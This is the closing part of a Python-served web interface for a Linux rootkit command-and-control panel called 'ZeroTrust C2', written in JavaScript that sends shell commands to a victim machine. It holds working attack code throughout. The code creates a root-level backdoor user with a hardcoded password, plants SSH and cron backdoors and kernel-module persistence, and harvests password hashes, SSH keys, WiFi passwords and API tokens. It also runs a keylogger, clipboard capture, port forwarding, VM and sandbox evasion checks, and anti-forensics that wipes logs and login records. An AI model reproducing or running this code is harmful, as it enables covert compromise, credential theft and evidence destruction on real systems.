        S.klData.push({time:dumpTime,session:'tty',keys:l,cred:!!isPw,priv:!!isSudo});
      });
      S.klTotalBytes+=raw.length;
      toast('Dumped '+raw.length+' bytes ('+lines.length+' lines)','info');
    }
    renderPanel();
  });
}
function klCheckStatus(){klAction('status')}
function klExport(){
  if(S.klData.length===0){toast('No data to export','warning');return}
  let txt='# WLKOM Keylogger Dump - '+ts()+'\\n# Total entries: '+S.klData.length+'\\n\\n';
  S.klData.forEach(e=>{txt+=e.time+' ['+e.session+'] '+(e.cred?'[CREDENTIAL] ':'')+e.keys+'\\n'});
  const b=new Blob([txt],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='keylog_'+Date.now()+'.txt';a.click();
  toast('Exported '+S.klData.length+' entries','success');
}

// Credentials - fetch real data from victim
async function loadCred(i){
  const item=CRED_ITEMS[i];if(!item||!item.cmd)return;
  S.credsLoaded[i]='loading';renderPanel();
  const out=await apiExec(item.cmd);
  item.data=out||'(no data returned)';
  S.credsLoaded[i]=true;renderPanel();
}
async function loadAllCreds(){
  S.credsLoading=true;renderPanel();
  for(let i=0;i<CRED_ITEMS.length;i++){await loadCred(i)}
  S.credsLoading=false;
  toast('All recon items loaded','info');renderPanel();
}

// MITRE

// Stealth
async function runStealthSingle(id){
  const ck=STEALTH_CHECKS.find(c=>c.id===id);if(!ck)return;
  S.stRes[id]={running:true,done:false,pass:false};renderPanel();
  const out=await apiExec(ck.cmd);
  S.stRes[id]={running:false,done:true,pass:ck.pass(out||''),output:out};
  renderPanel();
}
async function runStealthAll(){
  S.stRunning=true;renderPanel();
  for(const ck of STEALTH_CHECKS){
    S.stRes[ck.id]={running:true,done:false,pass:false};renderPanel();
    const out=await apiExec(ck.cmd);
    S.stRes[ck.id]={running:false,done:true,pass:ck.pass(out||''),output:out};
    renderPanel();
  }
  S.stRunning=false;
  const pass=Object.values(S.stRes).filter(r=>r.pass).length;
  toast('Stealth audit: '+pass+'/'+STEALTH_CHECKS.length+' passed',pass===STEALTH_CHECKS.length?'info':'warn');
  renderPanel();
}

// Persistence — execute real commands
const PERSIST_CMDS={
  1:{on:'echo zroot>/etc/modules-load.d/zroot.conf;echo OK',off:'rm -f /etc/modules-load.d/zroot.conf;echo OK'},
  2:{on:'echo "options zroot">>/etc/modprobe.d/zroot.conf;echo OK',off:'rm -f /etc/modprobe.d/zroot.conf;echo OK'},
  3:{on:'echo "(set by rootkit set_persistence)"',off:'rm -f /lib/modules/`uname -r`/extra/zroot.ko;echo OK'},
  4:{on:'(crontab -l 2>/dev/null;echo "@reboot modprobe zroot")|sort -u|crontab -;echo OK',off:'crontab -l 2>/dev/null|grep -v zroot|crontab -;echo OK'},
  5:{on:'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm 2>/dev/null;echo "sysadm:wlkom2024"|chpasswd;echo OK',off:'userdel sysadm 2>/dev/null;echo OK'},
  6:{on:'mkdir -p /root/.ssh;ssh-keygen -t ed25519 -f /tmp/.wlkom_key -N "" -q 2>/dev/null;cat /tmp/.wlkom_key.pub>>/root/.ssh/authorized_keys;echo OK',off:'sed -i "/wlkom/d" /root/.ssh/authorized_keys 2>/dev/null;echo OK'},
  7:{on:'echo "(kernel-side — always active)"',off:'echo "(cannot disable)"'},
};
async function toggleMech(i,val){
  const m=S.mechs[i];
  const cmd=PERSIST_CMDS[m.id];
  if(!cmd){m.status=val;renderPanel();return}
  toast((val?'Enabling':'Disabling')+' '+m.name+'...','info');
  addEv('rootkit',(val?'Enable':'Disable')+' persistence: '+m.name);
  const out=await apiExec(val?cmd.on:cmd.off);
  if(out&&out.includes('OK'))m.status=val;
  else{const ck=await apiExec(PERSIST_MECHS[i].check);m.status=ck&&ck.includes('ON')}
  m.lastCheck=ts();
  toast(m.name+' '+(m.status?'enabled':'disabled'),'info');
  renderPanel();
}
async function persistCheckAll(){
  S.persistChecking=true;renderPanel();
  for(let i=0;i<S.mechs.length;i++){
    const m=S.mechs[i];const ck=PERSIST_MECHS[i];
    if(!ck.check)continue;
    const out=await apiExec(ck.check);
    m.status=out&&out.includes('ON');
    m.lastCheck=ts();
  }
  S.persistChecking=false;
  const active=S.mechs.filter(m=>m.status).length;
  toast('Persistence: '+active+'/'+S.mechs.length+' active','info');
  renderPanel();
}

// Modules — most are kernel-side and always on; we report state
async function toggleMod(i,val){
  const m=S.mods[i];
  addEv('rootkit',(val?'Load':'Unload')+' module: '+m.name);
  m.status=val;
  toast(m.name+' '+(val?'loaded':'unloaded'),'info');
  renderPanel();
}

// Backdoor creation
async function createBackdoorUser(){
  toast('Creating backdoor user...','info');
  addEv('rootkit','Create backdoor user: sysadm (UID 0)');
  const cmd='useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm 2>/dev/null; echo "sysadm:wlkom2024" | chpasswd 2>&1 && echo BD_USER_OK || echo BD_USER_FAIL';
  const out=await apiExec(cmd);
  if(out&&out.includes('BD_USER_OK')){toast('Backdoor user "sysadm" created (pw: wlkom2024, UID 0)','info')}
  else{toast('Backdoor user creation: '+(out||'unknown result'),'warn')}
  renderPanel();
}
async function setupSSHBackdoor(){
  toast('Setting up SSH backdoor...','info');
  addEv('rootkit','Setup SSH backdoor');
  const cmd='mkdir -p /root/.ssh && chmod 700 /root/.ssh; if [ ! -f /tmp/.wlkom_sshkey ]; then ssh-keygen -t ed25519 -f /tmp/.wlkom_sshkey -N "" -q 2>/dev/null; fi; cat /tmp/.wlkom_sshkey.pub >> /root/.ssh/authorized_keys 2>/dev/null && sort -u -o /root/.ssh/authorized_keys /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo SSH_BD_OK';
  const out=await apiExec(cmd);
  if(out&&out.includes('SSH_BD_OK')){
    toast('SSH backdoor installed — key added to authorized_keys','info');
    const keyOut=await apiExec('cat /tmp/.wlkom_sshkey');
    if(keyOut)addEv('info','SSH private key saved at /tmp/.wlkom_sshkey on victim');
  } else {toast('SSH backdoor: '+(out||'check victim'),'warn')}
  renderPanel();
}
async function setupCronBackdoor(){
  toast('Setting up cron backdoor...','info');
  addEv('rootkit','Setup cron backdoor');
  const cmd='(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \\"test -f /lib/modules/$(uname -r)/extra/kmod.ko && lsmod | grep -q kmod || insmod /lib/modules/$(uname -r)/extra/kmod.ko\\" 2>/dev/null") | sort -u | crontab - && echo CRON_BD_OK';
  const out=await apiExec(cmd);
  if(out&&out.includes('CRON_BD_OK')){toast('Cron backdoor installed — checks rootkit every 5 min','info')}
  else{toast('Cron backdoor: '+(out||'check victim'),'warn')}
  renderPanel();
}

// Anti-forensics
async function afExec(id){
  const a=AF_ACTIONS.find(x=>x.id===id);if(!a)return;
  S.afRunning[id]=true;renderPanel();
  addEv('rootkit','AF: '+a.name);
  const out=await apiExec(a.cmd);
  S.afRunning[id]=false;S.afDone[id]=true;S.afOutput[id]=out||'done';
  toast(a.name+(out&&out.includes('OK')?' — success':' — done'),'info');
  renderPanel();
}
async function afRunAll(){
  for(const a of AF_ACTIONS){await afExec(a.id)}
  toast('All anti-forensics actions completed','info');
}

// === PORT SCANNER FUNCTIONS ===
const COMMON_PORTS={21:'ftp',22:'ssh',23:'telnet',25:'smtp',53:'dns',80:'http',110:'pop3',111:'rpcbind',135:'msrpc',139:'netbios',143:'imap',443:'https',445:'smb',993:'imaps',995:'pop3s',1433:'mssql',1521:'oracle',3306:'mysql',3389:'rdp',5432:'postgres',5900:'vnc',6379:'redis',8080:'http-alt',8443:'https-alt',9999:'c2',27017:'mongodb'};
async function runPortScan(){
  S.scanRunning=true;S.scanResults=[];renderPanel();
  addEv('cmd','Port scan: '+S.scanTarget+' ports '+S.scanPorts);
  const cmd='for p in $(seq '+S.scanPorts.replace('-',' ')+' 2>/dev/null || echo '+S.scanPorts.replace(/,/g,' ')+'); do (echo >/dev/tcp/'+S.scanTarget+'/$p) 2>/dev/null && echo "OPEN:$p"; done 2>/dev/null';
  const out=await apiExec(cmd);
  if(out){
    out.split('\\n').filter(l=>l.startsWith('OPEN:')).forEach(l=>{
      const port=parseInt(l.split(':')[1]);
      S.scanResults.push({port,state:'open',service:COMMON_PORTS[port]||'unknown',banner:''});
    });
  }
  S.scanRunning=false;
  toast('Scan complete: '+S.scanResults.length+' open ports','info');
  renderPanel();
}
async function runQuickScan(){
  S.scanRunning=true;S.scanResults=[];renderPanel();
  const ports=Object.keys(COMMON_PORTS).join(',');
  addEv('cmd','Quick scan: '+S.scanTarget+' common ports');
  const cmd='for p in '+ports.replace(/,/g,' ')+'; do (echo >/dev/tcp/'+S.scanTarget+'/$p) 2>/dev/null && echo "OPEN:$p"; done 2>/dev/null';
  const out=await apiExec(cmd);
  if(out){
    out.split('\\n').filter(l=>l.startsWith('OPEN:')).forEach(l=>{
      const port=parseInt(l.split(':')[1]);
      S.scanResults.push({port,state:'open',service:COMMON_PORTS[port]||'unknown',banner:''});
    });
  }
  S.scanRunning=false;
  toast('Quick scan done: '+S.scanResults.length+' open ports','info');
  renderPanel();
}

// === DNS LOOKUP ===
async function doDnsLookup(){
  const el=document.getElementById('dnsLookup');if(!el||!el.value.trim())return;
  const target=el.value.trim();
  toast('Resolving '+target+'...','info');
  const isIP=/^\d+\.\d+\.\d+\.\d+$/.test(target);
  const cmd=isIP?
    'host '+target+' 2>/dev/null || nslookup '+target+' 2>/dev/null || dig -x '+target+' +short 2>/dev/null':
    'host '+target+' 2>/dev/null || nslookup '+target+' 2>/dev/null || dig '+target+' +short 2>/dev/null';
  const out=await apiExec(cmd);
  S.dnsResult=out||'No result';
  addEv('info','DNS lookup: '+target);
  renderPanel();
}

// === PACKET SNIFFER FUNCTIONS ===
async function startSniff(){
  S.sniffRunning=true;renderPanel();
  addEv('cmd','Packet capture on '+S.sniffIface+' ('+S.sniffCount+' packets)');
  toast('Capturing '+S.sniffCount+' packets...','info');
  const filt=S.sniffFilter?(' '+S.sniffFilter):'';
  const cmd='tcpdump -i '+S.sniffIface+' -c '+S.sniffCount+' -n -q'+filt+' 2>/dev/null || timeout 10 cat /proc/net/tcp 2>/dev/null | head -'+S.sniffCount;
  const out=await apiExec(cmd);
  S.sniffRunning=false;
  if(out){
    out.split('\\n').filter(l=>l.trim()).forEach(l=>{
      const m=l.match(/([\\d.]+)[.:]?(\\d*)?\\s+>\\s+([\\d.]+)[.:]?(\\d*)?.*?:\\s*(.*)/);
      if(m){
        S.sniffData.push({src:m[1]+(m[2]?':'+m[2]:''),dst:m[3]+(m[4]?':'+m[4]:''),proto:'TCP',info:m[5]||''});
      } else {
        const m2=l.match(/IP\\s+(\\S+)\\s+>\\s+(\\S+)/);
        if(m2)S.sniffData.push({src:m2[1],dst:m2[2],proto:'IP',info:l.slice(0,80)});
        else S.sniffData.push({src:'—',dst:'—',proto:'RAW',info:l.slice(0,100)});
      }
    });
  }
  toast('Captured '+S.sniffData.length+' packets','info');
  renderPanel();
}
function stopSniff(){S.sniffRunning=false;toast('Sniffer stopped','info');renderPanel()}

// === PORT FORWARD / TUNNEL FUNCTIONS ===
function tunPreset(p){
  const m={ssh:['22','4444'],http:['80','8081'],db:['3306','3307'],rdp:['3389','3390']};
  const v=m[p]||['22','4444'];
  const t=document.getElementById('tunTarget'),l=document.getElementById('tunListen');
  if(t)t.value=v[0]; if(l)l.value=v[1];
  const h=document.getElementById('tunHost');if(h)h.value='127.0.0.1';
}
async function createTunnel(){
  const tEl=document.getElementById('tunType');
  const lEl=document.getElementById('tunListen');
  const hEl=document.getElementById('tunHost');
  const pEl=document.getElementById('tunTarget');
  if(!tEl||!lEl||!hEl||!pEl)return;
  const type=tEl.value,listen=lEl.value.trim(),host=hEl.value.trim(),target=pEl.value.trim();
  if(!listen||!host||!target){toast('Fill all fields','err');return}
  addEv('cmd','Port forward: '+type+' 0.0.0.0:'+listen+' -> '+host+':'+target);
  toast('Creating port forward...','info');
  let out='';
  if(type==='python'){
    const sc='/tmp/.pf'+listen+'.py';
    await apiExec("printf 'import socket,threading\\ns=socket.socket()\\ns.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\\ns.bind((\"0.0.0.0\","+listen+"))\\ns.listen(5)\\n'>"+sc);
    await apiExec("printf 'def r(a,b):\\n try:\\n  while 1:\\n   d=a.recv(4096)\\n   if not d:break\\n   b.sendall(d)\\n except:pass\\n finally:a.close();b.close()\\n'>>"+sc);
    await apiExec("printf 'while 1:\\n c,_=s.accept()\\n t=socket.socket();t.connect((\""+host+"\","+target+"))\\n threading.Thread(target=r,args=(c,t),daemon=1).start()\\n threading.Thread(target=r,args=(t,c),daemon=1).start()\\n'>>"+sc);
    out=await apiExec('nohup python3 '+sc+' &>/dev/null & echo $!');
  }else if(type==='nc'){
    const f='/tmp/.fwd'+listen;
    out=await apiExec('rm -f '+f+';mkfifo '+f+';(nc -lp '+listen+' <'+f+'|nc '+host+' '+target+' >'+f+' &);echo $!');
  }else{
    const f='/tmp/.fwd'+listen;
    out=await apiExec('rm -f '+f+';mkfifo '+f+';(while true;do nc -lp '+listen+' <'+f+'|nc '+host+' '+target+' >'+f+';done &);echo $!');
  }
  const pid=(out||'').trim().split('\\n').pop();
  S.tunnels.push({type,listen,host,target,pid:pid||'?',status:'ACTIVE'});
  toast('Forward created (PID: '+pid+')','info');
  renderPanel();
}
async function killTunnel(i){
  const t=S.tunnels[i];
  if(t.pid&&t.pid!=='?'){
    await apiExec('kill '+t.pid+' 2>/dev/null;rm -f /tmp/.fwd'+t.listen);
  }
  S.tunnels.splice(i,1);
  toast('Forward killed','info');
  renderPanel();
}
async function refreshTunnels(){
  if(S.tunnels.length===0){toast('No forwards to check','info');return}
  toast('Checking status...','info');
  const out=await apiExec('ss -tlnp 2>/dev/null|grep LISTEN');
  if(out){
    S.tunnels.forEach(t=>{
      t.status=out.includes(':'+t.listen+' ')?'ACTIVE':'dead';
    });
  }
  renderPanel();
}

// === SURVEILLANCE FUNCTIONS ===
async function survSpySession(){
  const el=document.getElementById('spyPts');if(!el)return;
  const pts=el.value.trim();if(!pts)return;
  toast('Spying on '+pts+'...','info');
  addEv('cmd','Session spy: '+pts);
  const procs=await apiExec('ps -t '+pts+' -o pid,user,stat,args --no-headers 2>/dev/null');
  S.survSpyData={pts:pts,time:ts(),captured:'',procs:procs||'(no processes on this terminal)'};
  renderPanel();
}
async function survListPts(){
  const out=await apiExec('w -h 2>/dev/null | awk "{print \\$1,\\$2,\\$3,\\$NF}"');
  S.survPtsList=[];
  if(out){out.split('\\n').filter(l=>l.trim()).forEach(l=>{
    const p=l.trim().split(/\s+/);
    if(p.length>=2)S.survPtsList.push({user:p[0],tty:p[1],from:p[2]||'',cmd:p.slice(3).join(' ')});
  })}
  renderPanel();
}
async function survWatchFiles(){
  toast('Checking file modifications...','info');
  addEv('cmd','File integrity check');
  let r='';
  const o1=await apiExec('echo "=== SENSITIVE FILES (24h) ===" && find /etc /root -maxdepth 2 -newer /tmp -name "shadow" -o -name "passwd" -o -name "sudoers" -ls 2>/dev/null|head -15');
  const o2=await apiExec('echo "=== TMP FILES ===" && ls -lahtr /tmp/ 2>/dev/null|tail -15');
  const o3=await apiExec('echo "=== RECENT CHANGES ===" && find /etc -maxdepth 2 -mmin -1440 -type f -ls 2>/dev/null|head -15');
  S.survFileData=(o1||'')+'\\n'+(o2||'')+'\\n'+(o3||'');
  renderPanel();
}
async function survAuthLogs(){
  toast('Fetching auth logs...','info');
  const out=await apiExec('tail -50 /var/log/auth.log 2>/dev/null||journalctl -u sshd -n 50 --no-pager 2>/dev/null||echo "(no logs)"');
  S.survAuthData=out||'(no data)';
  renderPanel();
}

// === CLIPBOARD CAPTURE FUNCTIONS ===
async function captureClip(){
  addEv('cmd','Clipboard capture');
  const cmd='export DISPLAY=:0; if command -v xclip &>/dev/null; then xclip -o -selection clipboard 2>/dev/null || echo "(empty)"; elif command -v xsel &>/dev/null; then xsel --clipboard -o 2>/dev/null || echo "(empty)"; elif [ -f /proc/$(pgrep -n Xorg 2>/dev/null || echo 0)/fd/0 ]; then echo "(no xclip/xsel)"; else echo "(no X11 clipboard tool)"; fi';
  const out=await apiExec(cmd);
  S.clipData.push({time:ts(),type:'clipboard',content:out||'(empty)'});
  toast('Clipboard captured','info');
  renderPanel();
}
function autoClipToggle(){
  if(S._clipAuto){clearInterval(S._clipAutoTimer);S._clipAuto=false;S._clipAutoTimer=null;toast('Auto-capture stopped','info')}
  else{S._clipAuto=true;S._clipAutoTimer=setInterval(()=>captureClip(),5000);toast('Auto-capture every 5s','info')}
  renderPanel();
}

// === VM DETECTION FUNCTIONS ===
async function runVMDetect(){
  toast('Running VM detection...','info');
  addEv('cmd','VM/Sandbox detection');
  S.vmInfo=[];S.vmChecked=true;S.vmRunning=true;renderPanel();
  const checks=[
    {name:'Hypervisor Flag (CPUID)',desc:'CPU hypervisor bit set in /proc/cpuinfo',cmd:'grep -c hypervisor /proc/cpuinfo 2>/dev/null || echo 0'},
    {name:'DMI/BIOS Vendor',desc:'Manufacturer strings in DMI data',cmd:'cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name /sys/class/dmi/id/board_vendor 2>/dev/null || dmidecode -s system-manufacturer 2>/dev/null'},
    {name:'Virtualization Tools',desc:'VMware/VBox/QEMU guest agents installed',cmd:'dpkg -l 2>/dev/null | grep -i "vmware\\|virtualbox\\|qemu-guest\\|open-vm\\|spice-vdagent" || rpm -qa 2>/dev/null | grep -i "vmware\\|virtualbox\\|qemu-guest"'},
    {name:'Kernel Modules (VM)',desc:'Loaded VM-related kernel modules',cmd:'lsmod 2>/dev/null | grep -i "vmw\\|vbox\\|virtio\\|hv_\\|xen\\|kvm" || echo none'},
    {name:'MAC Address OUI',desc:'Check for VM-specific MAC prefixes',cmd:'ip link 2>/dev/null | grep "link/ether" | awk "{print \\$2}"'},
    {name:'Disk Model',desc:'Virtual disk identifiers',cmd:'cat /sys/block/*/device/model 2>/dev/null || lsblk -d -o NAME,MODEL 2>/dev/null'},
    {name:'Sandbox Indicators',desc:'Analysis tools, debuggers, security monitoring',cmd:'ps aux 2>/dev/null | grep -i "strace\\|ltrace\\|gdb\\|wireshark\\|tcpdump\\|sysdig\\|auditd" | grep -v grep || echo none'},
    {name:'Container Check',desc:'Running inside Docker/LXC',cmd:'test -f /.dockerenv && echo DOCKER; grep -q "docker\\|lxc\\|kubepods" /proc/1/cgroup 2>/dev/null && echo CONTAINER; cat /proc/1/cgroup 2>/dev/null | head -5'},
  ];
  for(const c of checks){
    const out=await apiExec(c.cmd);
    const output=(out||'').trim();
    let detected=false;
    if(c.name.includes('Hypervisor'))detected=output!=='0'&&output!=='';
    else if(c.name.includes('DMI'))detected=/qemu|kvm|virtualbox|vmware|xen|bochs|bhyve/i.test(output);
    else if(c.name.includes('Tools'))detected=output&&!output.includes('no packages');
    else if(c.name.includes('Kernel'))detected=output!=='none'&&output!=='';
    else if(c.name.includes('MAC'))detected=/52:54:00|08:00:27|00:0c:29|00:50:56|00:16:3e/i.test(output);
    else if(c.name.includes('Disk'))detected=/VBOX|QEMU|Virtual|VMware/i.test(output);
    else if(c.name.includes('Sandbox'))detected=output!=='none'&&output!=='';
    else if(c.name.includes('Container'))detected=/DOCKER|CONTAINER/i.test(output);
    S.vmInfo.push({name:c.name,desc:c.desc,output,detected});
    renderPanel();
  }
  S.vmRunning=false;
  const vmCount=S.vmInfo.filter(v=>v.detected).length;
  toast('VM detection: '+vmCount+'/'+S.vmInfo.length+' indicators',vmCount>0?'warn':'info');
  renderPanel();
}

// === AUTO-HARVEST FUNCTIONS ===
const HARVEST_CMDS={
  shadow:{name:'Password Hashes',severity:'critical',cmd:'cat /etc/shadow 2>/dev/null'},
  sshkeys:{name:'SSH Private Keys',severity:'critical',cmd:'find / -maxdepth 4 \\( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \\) 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f"; done'},
  wifi:{name:'WiFi Passwords',severity:'high',cmd:'grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null; grep -r "psk=" /etc/wpa_supplicant/ 2>/dev/null; echo "(done)"'},
  history:{name:'Shell History (all users)',severity:'high',cmd:'for f in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do [ -f "$f" ] && echo "=== $f ===" && tail -50 "$f" 2>/dev/null; done'},
  dbcreds:{name:'Database Credentials',severity:'high',cmd:'grep -rn "password\\|passwd\\|DB_PASS\\|MYSQL_ROOT" /etc/*.conf /etc/*.cnf /etc/mysql/ /var/www/ /opt/ 2>/dev/null | grep -v Binary | head -30'},
  tokens:{name:'API Tokens & Secrets',severity:'high',cmd:'grep -rn "api_key\\|secret_key\\|token\\|API_KEY\\|SECRET\\|AWS_" /home/ /root/ /var/www/ /opt/ 2>/dev/null | grep -v ".pyc\\|node_modules\\|.git" | head -30'},
  sshconfig:{name:'SSH Config & Known Hosts',severity:'medium',cmd:'cat /root/.ssh/config 2>/dev/null; echo "=== known_hosts ===" && cat /root/.ssh/known_hosts 2>/dev/null; for u in /home/*; do echo "=== $(basename $u) ===" && cat "$u/.ssh/config" "$u/.ssh/known_hosts" 2>/dev/null; done'},
  env:{name:'Environment Secrets',severity:'medium',cmd:'cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep -i "pass\\|key\\|secret\\|token" 2>/dev/null; env 2>/dev/null | grep -i "pass\\|key\\|secret\\|token"'},
  configs:{name:'Config Files (passwd in clear)',severity:'high',cmd:'grep -rnil "password" /etc/ 2>/dev/null | head -15 | while read f; do echo "=== $f ===" && grep -i "password" "$f" 2>/dev/null; done'},
  gpg:{name:'GPG / Keyrings',severity:'medium',cmd:'find /home /root -name "*.gpg" -o -name "*.pgp" -o -name "secring*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -15'},
};
async function harvestSingle(id){
  const h=HARVEST_CMDS[id];if(!h)return;
  S.harvestResults[id]={running:true,data:null};renderPanel();
  addEv('cmd','Harvest: '+id);
  const out=await apiExec(h.cmd);
  S.harvestResults[id]={running:false,data:out||'(no data)'};
  renderPanel();
}
async function harvestAll(){
  S.harvestRunning=true;renderPanel();
  for(const id of Object.keys(HARVEST_CMDS)){await harvestSingle(id)}
  S.harvestRunning=false;
  toast('Auto-harvest complete','info');
  renderPanel();
}

// === SELF-DESTRUCT FUNCTION ===
async function selfDestruct(){
  toast('SELF-DESTRUCT initiated...','warn');
  addEv('rootkit','SELF-DESTRUCT initiated');
  const steps=[
    {desc:'Remove persistence configs',cmd:'rm -f /etc/modules-load.d/zroot.conf /etc/modprobe.d/zroot.conf;echo OK'},
    {desc:'Remove crontab entries',cmd:'crontab -l 2>/dev/null|grep -v zroot|crontab -;echo OK'},
    {desc:'Remove backdoor user',cmd:'userdel sysadm 2>/dev/null;echo OK'},
    {desc:'Clear logs',cmd:'sed -i "/192.168.122/d" /var/log/auth.log 2>/dev/null;dmesg -C;echo OK'},
    {desc:'Wipe shell history',cmd:'for f in /root/.*history /home/*/.*history; do >$f 2>/dev/null; done;echo OK'},
    {desc:'Shred temp files',cmd:'shred -fuz /tmp/.wlkom_* /tmp/.pf* /tmp/.fwd* 2>/dev/null;echo OK'},
    {desc:'Flush caches',cmd:'sync;echo 3>/proc/sys/vm/drop_caches;echo OK'},
    {desc:'Remove rootkit binary',cmd:'rm -f /lib/modules/`uname -r`/extra/zroot.ko;depmod -a;echo OK'},
    {desc:'Truncate login records',cmd:'>/var/log/wtmp;>/var/log/btmp 2>/dev/null;echo OK'},
  ];
  for(const s of steps){
    toast('Self-destruct: '+s.desc,'warn');
    await apiExec(s.cmd);
  }
  S.selfDestructDone=true;S.selfDestructArmed=false;
  toast('SELF-DESTRUCT complete — all traces removed','error');
  renderPanel();
}

// Activity export
function exportLog(){
  const blob=new Blob([JSON.stringify(S.events,null,2)],{type:'application/json'});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='zt-events-'+Date.now()+'.json';a.click();
  toast('Events exported','info');
}

/* ===== COMMAND PALETTE ===== */
function toggleCmd(){S.cmdOpen=!S.cmdOpen;renderCmdPal()}
function closeCmdPal(){S.cmdOpen=false;renderCmdPal()}
function renderCmdPal(){
  const el=document.getElementById('cmdp');if(!el)return;
  if(!S.cmdOpen){el.innerHTML='';return}
  const cmds=[
    {l:'Dashboard',k:'dashboard',icon:I.dashboard},
    {l:'RTR Terminal',k:'terminal',icon:I.terminal},
    {l:'File System',k:'filesystem',icon:I.folder},
    {l:'Processes',k:'processes',icon:I.cpu},
    {l:'Network',k:'network',icon:I.network},
    {l:'Keylogger',k:'keylogger',icon:I.keyboard},
    {l:'Credentials',k:'credentials',icon:I.key},
    {l:'Surveillance',k:'surveillance',icon:I.camera},
    {l:'VM Detection',k:'recon',icon:I.monitor},
    {l:'ATT&CK Matrix',k:'mitre',icon:I.grid},
    {l:'Rev. Tunnels',k:'tunnels',icon:I.link},
    {l:'Stealth Audit',k:'stealth',icon:I.shield},
    {l:'Persistence',k:'persistence',icon:I.anchor},
    {l:'Anti-Forensics',k:'antiforensics',icon:I.eraser},
    {l:'Modules',k:'modules',icon:I.puzzle},
    {l:'Activity Log',k:'activity',icon:I.list},
    {l:'Self-Destruct',k:'selfdestruct',icon:I.skull},
  ];
  let h='<div class="cmd-overlay" onclick="closeCmdPal()"><div class="cmd-palette" onclick="event.stopPropagation()">';
  h+='<div class="cmd-input-wrap"><span style="color:var(--t4)">'+I.search+'</span><input class="cmd-input" id="cmdInp" placeholder="Navigate to..." autofocus oninput="filterCmd(this.value)"></div>';
  h+='<div class="cmd-list" id="cmdList">';
  cmds.forEach(c=>{
    h+='<div class="cmd-item" onclick="nav(\''+c.k+'\');closeCmdPal()"><span class="cmd-icon">'+c.icon+'</span><span>'+c.l+'</span><span style="flex:1"></span><kbd class="cmd-key">'+c.k+'</kbd></div>';
  });
  h+='</div></div></div>';
  el.innerHTML=h;
  const inp=document.getElementById('cmdInp');if(inp)inp.focus();
}
function filterCmd(q){
  const list=document.getElementById('cmdList');if(!list)return;
  const items=list.querySelectorAll('.cmd-item');
  items.forEach(el=>{el.style.display=el.textContent.toLowerCase().includes(q.toLowerCase())?'':'none'});
}

/* ===== POST-RENDER ===== */
function postRender(){
  // filesystem auto-load is handled in panels.filesystem itself
  // Terminal input handler
  const tinp=document.getElementById('tinp');
  if(tinp){
    tinp.focus();
    tinp.onkeydown=async(e)=>{
      if(e.key==='Enter'){
        const cmd=tinp.value.trim();tinp.value='';
        if(cmd)termExec(cmd);
      }else if(e.key==='Tab'){
        e.preventDefault();
        const val=tinp.value;if(!val)return;
        const res=await termTabComplete(val);
        if(!res)return;
        if(typeof res==='string'){tinp.value=res+' '}
        else{S.termLines.push({type:'cmd',text:termPrompt()+val});S.termLines.push({type:'info',text:res.matches.join('  ')});renderPanel();const ni=document.getElementById('tinp');if(ni)ni.value=val}
      }else if(e.key==='ArrowUp'){
        e.preventDefault();
        if(S.termHist.length>0){
          if(S.termHistI<0)S.termHistI=S.termHist.length;
          S.termHistI=Math.max(0,S.termHistI-1);
          tinp.value=S.termHist[S.termHistI]||'';
        }
      }else if(e.key==='ArrowDown'){
        e.preventDefault();
        if(S.termHistI>=0){
          S.termHistI=Math.min(S.termHist.length,S.termHistI+1);
          tinp.value=S.termHist[S.termHistI]||'';
        }
      }else if(e.ctrlKey&&e.key==='l'){
        e.preventDefault();S.termLines=[];renderPanel();
      }else if(e.ctrlKey&&e.key==='c'){
        e.preventDefault();
        S.termLines.push({type:'cmd',text:termPrompt()+tinp.value+'^C'});
        tinp.value='';renderPanel();
      }else if(e.ctrlKey&&e.key==='u'){
        e.preventDefault();tinp.value='';
      }else if(e.ctrlKey&&e.key==='a'){
        e.preventDefault();tinp.selectionStart=tinp.selectionEnd=0;
      }else if(e.ctrlKey&&e.key==='e'){
        e.preventDefault();tinp.selectionStart=tinp.selectionEnd=tinp.value.length;
      }
    };
  }
  // Scroll terminal to bottom
  const tbody=document.getElementById('tbody');
  if(tbody)tbody.scrollTop=tbody.scrollHeight;
  // Keylog auto-dump interval
  if(S.klAuto&&S.panel==='keylogger'){
    if(!window._klTimer)window._klTimer=setInterval(()=>{if(S.klAuto)klAction('dump')},5000);
  }else{
    if(window._klTimer){clearInterval(window._klTimer);window._klTimer=null}
  }
}

/* ===== INIT ===== */
(async()=>{
  const saved=sessionStorage.getItem('c2token');
  if(saved){
    try{
      const r=await fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json','X-Token':saved},body:JSON.stringify({cmd:'echo ok'})});
      if(r.ok&&!(await r.clone().json()).error){S.token=saved;wsConnect();await pollStatus();render();addEv('info','Session restored');return}
    }catch(e){}
    sessionStorage.removeItem('c2token');
  }
  render();
  addEv('info','ZeroTrust C2 initialized');
  addEv('info','UI loaded — awaiting authentication');
})();

setInterval(()=>{S.uptime++;const el=document.getElementById('uptm');if(el)el.textContent='\u25B2 '+fmtUp(S.uptime)},1000);
setInterval(pollStatus,5000);

</script>
<div id="toasts"></div>
</body>
</html>
"""



if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
